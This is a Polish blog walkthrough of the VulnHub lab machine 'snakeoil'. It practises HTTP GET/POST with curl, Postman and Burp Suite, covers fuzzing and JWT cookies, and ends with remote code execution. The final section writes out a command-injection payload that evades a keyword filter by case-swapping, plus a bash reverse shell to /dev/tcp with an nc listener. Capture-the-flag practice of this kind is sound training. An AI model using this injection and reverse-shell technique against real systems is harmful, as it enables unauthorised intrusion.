---
title: "digitalworld.local: snakeoil - GET, POST"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Vulnhub
  - Walkthrough  
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_4:
  - url: /assets/images/hacking/2021/10/01.png
    image_path: /assets/images/hacking/2021/10/01.png
  - url: /assets/images/hacking/2021/10/02.png
    image_path: /assets/images/hacking/2021/10/02.png
  - url: /assets/images/hacking/2021/10/03.png
    image_path: /assets/images/hacking/2021/10/03.png
  - url: /assets/images/hacking/2021/10/04.png
    image_path: /assets/images/hacking/2021/10/04.png
gallery6_7:
  - url: /assets/images/hacking/2021/10/06.png
    image_path: /assets/images/hacking/2021/10/06.png
  - url: /assets/images/hacking/2021/10/07.png
    image_path: /assets/images/hacking/2021/10/07.png
---
# Wstęp
[digitalworld.local: snakeoil](https://www.vulnhub.com/entry/digitalworldlocal-snakeoil,738/) jest ciekawą i nieszablonową maszyną z paru powodów: wykorzystane są tokeny **JWT** (JSON Web Token), format **JSON** (JavaScript Object Notation), możemy na niej przećwiczyć metody **HTTP** typu **GET**, **POST** w popularnych programach. Przećwiczymy to na trzech: tekstowy [Curl](https://curl.se/download.html) - link jest tutaj w sumie zbędny, posiada go chyba każde repozytorium, ale podaje dla formalności; drugim programem będzie [Burp Suite](https://portswigger.net/burp) i trzecim, który ostatnio wpadł mi w oko będzie [Postman](https://www.postman.com/), który znalazłem na [YouTube](https://www.youtube.com/watch?v=RqqRScUwNlA). Tam też jest instrukcja, jak przejść **Snakeoil**. Ale zrobimy to po swojemu i się skupimy głównie na programach, które wyżej wymieniłem.
{: .text-justify}
# Zaczynamy
## Metasploit i Db_nmap
Jeżeli nie chcecie ciągle wpisywać tych samych komend, **Metasploit** umożliwia nam w pewnym sensie automatyzację. Wystarczy użyć polecenie **resource**. A jak to działa? Po prostu tworzymy komendy w pliku i potem uruchamiamy wpisując **resource [nazwa_zasobów]**. Prawda, że proste? 
{: .text-justify}
<div class="notice--primary" markdown="1">
```bash
root@kali:/home/szikers/snackoil# echo 'workspace "Snakeoil: 1"' >> snakeoil.rc
root@kali:/home/szikers/snackoil# echo "db_nmap -A -p- 172.16.1.141" >> snakeoil.rc
root@kali:/home/szikers/snackoil# msfconsole
```
```console
msf6 > resource snakeoil.rc
[*] Processing /home/szikers/snackoil/snakeoil.rc for ERB directives.
resource (/home/szikers/snackoil/snakeoil.rc)> workspace "Snakeoil: 1"
[*] Workspace: Snakeoil: 1
resource (/home/szikers/snackoil/snakeoil.rc)> db_nmap -A -p- 172.16.1.141
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 21:31 CEST
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
[*] Nmap: 80/tcp   open  http    nginx 1.14.2
[*] Nmap: 8080/tcp open  http    nginx 1.14.2
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```
</div>
Po przeskanowaniu wirtualki, widzimy że są otwarte trzy porty. Ten co będzie nas interesować, to port **8080**.
{: .text-justify}
## Ffuf
**Ffuf** czyli **Fuzz Faster U Fool** jest bardzo szybkim fuzzerem bez natłoku funkcji. Wg. mnie ma wszystko co jest potrzebne. Zamiast **Dirb** lub **GoBuster** w tym artykule do skanowania użyjemy tylko powyższego fuzzera.
{: .text-justify}
```console
root@kali:/home/szikers# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.16.1.141:8080/FUZZ -mc all -fc 404

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.1.141:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

                        [Status: 200, Size: 3391, Words: 772, Lines: 89]
01                      [Status: 200, Size: 2193, Words: 338, Lines: 47]
02                      [Status: 200, Size: 2356, Words: 361, Lines: 51]
04                      [Status: 200, Size: 2326, Words: 353, Lines: 45]
05                      [Status: 200, Size: 2121, Words: 328, Lines: 45]
06                      [Status: 200, Size: 2156, Words: 328, Lines: 45]
1                       [Status: 200, Size: 2193, Words: 338, Lines: 47]
2                       [Status: 200, Size: 2356, Words: 361, Lines: 51]
4                       [Status: 200, Size: 2326, Words: 353, Lines: 45]
5                       [Status: 200, Size: 2121, Words: 328, Lines: 45]
6                       [Status: 200, Size: 2156, Words: 328, Lines: 45]
create                  [Status: 200, Size: 2596, Words: 447, Lines: 61]
login                   [Status: 405, Size: 64, Words: 10, Lines: 2]
registration            [Status: 200, Size: 29, Words: 3, Lines: 2]
run                     [Status: 405, Size: 178, Words: 20, Lines: 5]
secret                  [Status: 500, Size: 37, Words: 4, Lines: 2]
test                    [Status: 200, Size: 17, Words: 2, Lines: 2]
users                   [Status: 200, Size: 267, Words: 9, Lines: 2]
:: Progress: [4614/4614] :: Job [1/1] :: 779 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```
Prawdę mówiąc w tym wypadku **Dirb** dałby taki sam wynik, ale we **Ffuf** można stosować filtry, np. wyszukiwać tylko pliki, które zawierają słowo **password**.
{: .text-justify}
# Metody GET, POST
**Ffuf** znalazł trochę plików. Interesować nas zaś będą: **login**, **registration**, **run**, **secret**, zaś **users** niekoniecznie. Jak widzicie, podczas skanu nie wszystkie zwróciły kod powrotu **200**. Niektóre mają **405**, a to oznacza, że do przeszukiwania niektórych zasobów używaliśmy niedozwolonych metod - w tym wypadku **GET**. Plik **secret** ma kod **500**, czyli wewnętrzny błąd serwera. 
{: .text-justify}
### curl
Widzimy, że kod powrotu dla **login** wynosi **405**, więc **GET** jest w tym wypadku niedozwoloną metodą. Uruchamiając program **Curl** z parametrem **-I** widzimy, że metodami, które można użyć są **OPTIONS** i **POST**:
{: .text-justify}
```console
root@kali:/home/szikers# curl -I http://172.16.1.141:8080/login
HTTP/1.1 405 METHOD NOT ALLOWED
Server: nginx/1.14.2
Date: Tue, 14 Sep 2021 20:56:52 GMT
Content-Type: application/json
Content-Length: 64
Connection: keep-alive
Allow: OPTIONS, POST
```
Spróbujmy coś zrobić z **POST**:
{: .text-justify}
```console
root@kali:/home/szikers# curl -X POST  http://172.16.1.141:8080/login
{"message": {"username": "Username field cannot be blank."}}
```
Już lepiej, mamy odpowiedź, że pole **username** nie może być puste.
{: .text-justify}
```console
root@kali:/home/szikers# curl -X POST -H "Content-Type: application/json" -d '{"username":"snackoil"}' http://172.16.1.141:8080/login
{"message": {"password": "Password field cannot be blank."}}
```
Teraz mamy odpowiedź, że hasło nie może być puste. Kontynuujmy tę przepychankę w programie **Postman**.
{: .text-justify}
### Postman
{% include gallery id="gallery1_4" caption="Postman" %}
Jak widzimy, nie ma użytkownika **snackoil**. Więc go zakładamy i nadajemy mu hasło poprzez [link](http://172.16.1.141:8080/create), potem się [logujemy](http://172.16.1.141:8080/login) i dostajemy token, który możemy sprawdzić na [stronie](https://jwt.io/)
{: .text-justify}
![xcp](/assets/images/hacking/2021/10/05.png)
### Burp Suite
Pozostaje nam wykorzystać adres z końcówką **run**. Najpierw wchodzimy na [link](http://172.16.1.141:8080/run) przez przeglądarkę i przechwytujemy nagłówek poprzez **Burp Suite**. Potem przechodzimy do sekcji **repeater** i wysyłamy nagłówek. Podczas tej czynności dostajemy komunikat **Method Not Allowed**. Więc zamieniamy **GET** na **POST**. Należy pamiętać, żeby w nagłówku dodać **Content-Type: application/json**. Na poniższych rysunkach jest przedstawione jak to wygląda:
{: .text-justify}
{% include gallery id="gallery6_7" caption="Burp Suite" %}
### Curl
Okazuje się, że potrzebujemy sekretnego klucza, który jest w urlu **http://172.16.1.141:8080/secret**:
{: .text-justify}
Wróćmy na chwilę do **Curl**a, ale nie zamykajmy jeszcze okna w **Burp Suite**. Przechodzimy znowu do **Curl**a. Wchodząc na podany [link](https://flask-jwt-extended.readthedocs.io/en/stable/options/) frameworka **Flask**a się dowiadujemy, że opcja **JWT_ACCESS_COOKIE_NAME** umożliwia wysłanie nasz token poprzez ciasteczko, domyślnie się nazywa **access_token_cookie**.
{: .text-justify}

![xcp](/assets/images/hacking/2021/10/08.png)

Wynika z tego, że musimy podać klucz w ciasteczku (jak to zabrzmiało :smiley: ) i wysłać na serwer:
{: .text-justify}
```console
root@kali:/home/szikers# curl --cookie "access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTYzMTczNDE4NywianRpIjoiZjU4NDNhMmUtOTYzOC00NTFlLTg2NDktOTczMGQzNGUzZmUwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InNuYWNrb2lsIiwibmJmIjoxNjMxNzM0MTg3LCJleHAiOjE2MzE3MzUwODd9.18oenH8p5IsRYLes02qLICWh_wAYXvCxaVib_H-hbmQ"  http://172.16.1.141:8080/secret
{"ip-address": "", "secret_key": "commandexecutionissecret"}
```
### Burp Suite
Mamy nasz sekretny klucz. Parametr **"url"** jest podatny na **command injection**. Niestety, nie możemy wrzucić stringów typu: **bash**, **/dev/tcp**, bo dostajemy bana. Skrypt na serwerze od razu filtruje te słowa, ale możemy zrobić coś innego. Wrzucić klucz publiczny **id_rsa.pub** do katalogu **.ssh**, jak to zrobił na filmiku **InfoSecLab**, albo tak przerobić nasz tekst żeby przeszedł filtry. Zrobimy to drugie. Stworzymy **payload**, który się będzie łączył na port **12345**, ale żeby to zadziałało, to najpierw małe litery w naszym ładunku zamienimy na duże, wrzucimy to wszystko do pliku, potem odwrócimy wielkość liter i uruchomimy nasz skrypt. Oczywiście można to inaczej zrobić, żeby zadziałało. Np. zakodować plik do **MD5**, potem odkodować, itd... ale zanim wrzucimy nasz ładunek, trzeba włączyć na naszym serwerze nasłuchiwanie na porcie **12345**.
{: .text-justify}
```bash
nc -lvp 12345
```
A w naszym nagłówku umieszczamy takie coś:
{: .text-justify}
```console
POST /run HTTP/1.1
Host: 172.16.1.141:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 227

{
"url":"--help >/dev/null ; echo '#!/BIN/BASH' >1.sh; echo 'BASH -i > /DEV/TCP/172.16.1.10/12345 0>&1 2>&1' >> 1.sh; tr [:upper:] [:lower:] <1.sh > 2.sh; chmod +x 2.sh; ./2.sh ;",
"secret_key":"commandexecutionissecret"
}
```
# Koniec
Wysyłamy nagłówek i jesteśmy na **patrick@SNAKEOIL**. Na koniec podpowiem, że interesuje nas plik **flask_blog/app.py**. Tam znajdziecie co trzeba.
{: .text-justify}
Mam nadzieję, że ten tutorial pomógł wam trochę poćwiczyć **JSON**a oraz metody **GET** i **POST**.
{: .text-justify}